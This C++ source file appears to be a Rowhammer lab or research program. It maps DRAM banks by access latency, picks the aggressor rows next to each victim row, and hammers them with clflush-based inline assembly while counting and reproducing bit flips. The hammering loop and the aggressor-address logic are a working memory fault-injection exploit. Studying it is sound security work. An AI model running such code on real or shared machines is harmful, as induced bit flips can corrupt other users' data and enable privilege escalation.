#include "../shared.hh"
#include "../util.hh"
#include "../params.hh"
#include "stdlib.h"
#include <random>

std::map<uint64_t, uint64_t> physaddr_bankno_map;
std::map<uint64_t, std::vector<uint64_t>> bank_to_physaddr_map;


/**
 * Since we load an entire row into the cache, need to flush every 64 bits
*/
void clflush_row(uint8_t *row_ptr) {
    for (uint32_t index = 0; index < ROW_SIZE; index += 64) {
        clflush((row_ptr + index));
    }
}
/**
 * Another method to flush a lot of things in the cacheline.
*/
void clflush_area(uint8_t *start_ptr, uint64_t size) {
    for (uint32_t index = 0; index < size; index += 64) {
        clflush((start_ptr + index));
    }
}
/**
 * TODO: Cache line flushing via eviction
 * Evict the cache line not using clflush, but by overwriting it with irrelevant addresses
*/
void cache_flush_eviction_method(uint64_t cacheline_size, uint64_t start_address) {
    for (uint32_t index = 0; index < cacheline_size; index ++) {
        // TODO: for 64 bit cache lines, flush it all by loading a bunch of irrelevant, different bank addresses.
    }
}


void get_bank_mapping(void * allocated_mem, uint64_t buffer_size_bytes) {

    const long int num_iterations = buffer_size_bytes / ROW_SIZE;
    uint64_t * base = (uint64_t *)allocated_mem;

    // Insert memory addresses into the map
    for (int i = 0; i < num_iterations; i++) { 
        
        // Set all to bank 0 initially
        uint64_t virt_addr = (uint64_t) base + i*ROW_SIZE;
        uint64_t phys_addr = virt_to_phys(virt_addr);
        physaddr_bankno_map[phys_addr] = 0;
    }


    // Iterate through the map and see if we can sort the rows
    for (auto addr_1 = physaddr_bankno_map.begin(); addr_1 != physaddr_bankno_map.end(); ++addr_1) {
        for (auto addr_2 = std::next(addr_1); addr_2 != physaddr_bankno_map.end(); ++addr_2) {
            uint64_t paddr1 = addr_1->first;
            uint64_t paddr2 = addr_2->first;
            uint64_t bank1 = addr_1->second;
            uint64_t bank2 = addr_2->second;

            // Extract virtual addresses i and j
            uint64_t vaddr1 = phys_to_virt(paddr1);
            uint64_t vaddr2 = phys_to_virt(paddr2);

            uint64_t time = measure_bank_latency(vaddr1 , vaddr2);
            
            // TODO: Shubh uses <600. Why?
            if (time >= ROW_BUFFER_CONFLICT_LATENCY ) {
                addr_2->second = bank1;
            } else {
                // Increment the bank number and ensure it stays within the range of 0 to 7
                addr_2->second = (bank2 + 1) % NUM_BANKS; // Modulus 8 ensures it stays within 0 to 7 range

            }
            
        }
        
    }
    
}

void create_banktoaddr_map() {

    // Initialize Arrays for bank to phys addr map
    for (uint64_t i= 0; i<NUM_BANKS; i++) {
        bank_to_physaddr_map[i] = std::vector<uint64_t>();
    }

    for (const auto& pair : physaddr_bankno_map) {
        int address = pair.first;
        int bank = pair.second;
        // Check if the bank already exists in the bank-to-addresses map
        
        // Add the address to the vector of addresses for the corresponding bank
        bank_to_physaddr_map[bank].push_back(address);
    }
}


void verify_same_bank(uint64_t samples, uint64_t bank_no) {
    std::vector<uint64_t> bank_addrs = bank_to_physaddr_map[bank_no];

    // Take 10 random elements
    for (int i = 0; i < samples; ++i) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, bank_addrs.size() - 1);

        int index1 = dis(gen); // Generate a random index
        uint64_t paddr_1 = bank_addrs[index1]; 
        int index2 = dis(gen); // Generate a random index
        uint64_t paddr_2 = bank_addrs[index2]; 

        // Extract virtual addresses i and j
        uint64_t vaddr1 = phys_to_virt(paddr_1);
        uint64_t vaddr2 = phys_to_virt(paddr_2);

        uint64_t time = measure_bank_latency(vaddr1 , vaddr2);

        if (time >= ROW_BUFFER_HIT_LATENCY && time < ROW_BUFFER_CONFLICT_LATENCY) {
            fprintf(stdout, "A: {%lu}, B: {%lu}, Latency: {%lu}. NOT IN SAME BANK DESPITE BEING SORTED AS SO", paddr_1, paddr_2, time);
        }
        if (time >= ROW_BUFFER_CONFLICT_LATENCY) {
            fprintf(stdout, "A: {%lu}, B: {%lu}, Latency: {%lu}. IN SAME BANK AND BEING SORTED AS SO", paddr_1, paddr_2, time);
        }

    }



}

uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {

    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
    
    clflush_row(vict_virt_addr_ptr);
    clflush_row(attacker_virt_addr_1_ptr);
    clflush_row(attacker_virt_addr_2_ptr);
  
    int num_reads = HAMMERS_PER_ITER;

    while (num_reads-- > 0 ) {
        asm volatile(
            "mov (%0), %%rax\n\t"
            "mov (%1), %%rax\n\t"
            "clflush (%0)\n\t"
            "clflush (%1)\n\t"
            "mfence\n\t"
            :
            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
            : "rax"
        );

        /*
        asm volatile(
            "str %2, [%0]\n\t"
            "str %2, [%1]\n\t"
            "DC CVAC, %0\n\t"
            "DC CVAC, %1\n\t"
            "DSB SY"
            ::"r" (addr1), "r" (addr2), "r" (temp)
          );
        */
    }

    clflush_row(vict_virt_addr_ptr);

    uint32_t number_of_bitflips_in_target = 0;
    for (uint32_t index = 0; index < ROW_SIZE; index++) {
        if (vict_virt_addr_ptr[index] != 0x55) {
            number_of_bitflips_in_target++;
        }
    }
    return number_of_bitflips_in_target; 
}

/**
 * returns 1 upon success, 0 upon failure.
*/
int get_addresses_to_hammer(uint64_t victim_phys_addr, uint64_t *attacker_1, uint64_t *attacker_2, int row_diff) {
    int tries = 1000;
    while (tries-- > 0) {
        uint64_t row_bits = victim_phys_addr >> 16; // Bit 16+ is for row bits
        uint64_t column_bits = victim_phys_addr & 0x1fff; // 13 col bits

        int bank_xor_bits = (victim_phys_addr >> 13) & 0x7; // Get Bank XOR Bits
        int bank = bank_xor_bits ^ (victim_phys_addr & 0x7);

            
        uint64_t new_row_bits1 = (uint64_t) (row_bits + row_diff);
        int bits_row_bank_xor1 = (new_row_bits1 & 0x7);

        int new_bank_xor_bits1 = bank ^ bits_row_bank_xor1;


        uint64_t new_row_bits2 = (uint64_t) (row_bits - row_diff);
        int bits_row_bank_xor2 = (new_row_bits2 & 0x7);

        int new_bank_xor_bits2 = bank ^ bits_row_bank_xor2;


        *attacker_1 = phys_to_virt(get_dram_address(new_row_bits1, new_bank_xor_bits1, column_bits));
        *attacker_2 = phys_to_virt(get_dram_address(new_row_bits2, new_bank_xor_bits2, column_bits));
        if (*attacker_1 != 0 && *attacker_2 != 0) return 1;
    }
    return 0;
}


void print_result(uint64_t victim, uint64_t attacker_1, uint64_t attacker_2, uint32_t num_bit_flips) {
    uint64_t x = virt_to_phys(victim);
    uint64_t a = virt_to_phys(attacker_1);
    uint64_t b = virt_to_phys(attacker_2);
    fprintf(stdout,"victim: %s\t%ld (phys)\n", int_to_binary(x, 33), x);
    fprintf(stdout,"attacker 1: %s\t%ld (phys)\n", int_to_binary(a, 33), a);
    fprintf(stdout,"attacker 2: %s\t%ld (phys)\n", int_to_binary(b, 33), b);
    fprintf(stdout,"Bit flips found: %d\n", num_bit_flips);
}



int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t mem_size = (uint64_t) ((uint64_t) BUFFER_SIZE_MB * (1024 * 1024));
    allocated_mem = allocate_pages(mem_size);
    setup_PPN_VPN_map(allocated_mem, mem_size);

    uint64_t victim; 
    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t));

    const long int num_iterations = mem_size / ROW_SIZE;

    fprintf(stdout, "=========================================================\n");
    fprintf(stdout, "Row +1, -1\n");
    fprintf(stdout, "=========================================================\n");

    for (int i = 1; i < num_iterations-1; i++) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * i);
        
        // row + 1, row - 1
        if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 1)) {
            uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
            //print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
            //if (num_bit_flips > 0) break;
            if (num_bit_flips > 0) {
                fprintf(stdout, "=========================================================\n");
                print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
                fprintf(stdout, "Bit Flips Found. Reproducing Bit Flips.\n");
                uint32_t num_bit_flips2 = hammer_addresses(victim, *attacker_1, *attacker_2);
                print_result(victim, *attacker_1, *attacker_2, num_bit_flips2);
                fprintf(stdout, "Try again? Reproducing Bit Flips.\n");
                uint32_t num_bit_flips3 = hammer_addresses(victim, *attacker_1, *attacker_2);
                print_result(victim, *attacker_1, *attacker_2, num_bit_flips3);
                fprintf(stdout, "=========================================================\n");
            }
        }
    }

    fprintf(stdout, "=========================================================\n");
    fprintf(stdout, "Row +2, -2\n");
    fprintf(stdout, "=========================================================\n");

    for (int i = 2; i < num_iterations-2; i++) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * i);
        // row + 2, row - 2
        if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 2)) {
            uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
            if (num_bit_flips > 0) {
                fprintf(stdout, "=========================================================\n");
                print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
                fprintf(stdout, "Bit Flips Found. Reproducing Bit Flips.\n");
                uint32_t num_bit_flips2 = hammer_addresses(victim, *attacker_1, *attacker_2);
                print_result(victim, *attacker_1, *attacker_2, num_bit_flips2);
                fprintf(stdout, "Try again? Reproducing Bit Flips.\n");
                uint32_t num_bit_flips3 = hammer_addresses(victim, *attacker_1, *attacker_2);
                print_result(victim, *attacker_1, *attacker_2, num_bit_flips3);
                fprintf(stdout, "=========================================================\n");

            }
            //if (num_bit_flips > 0) break;
        }
    }

}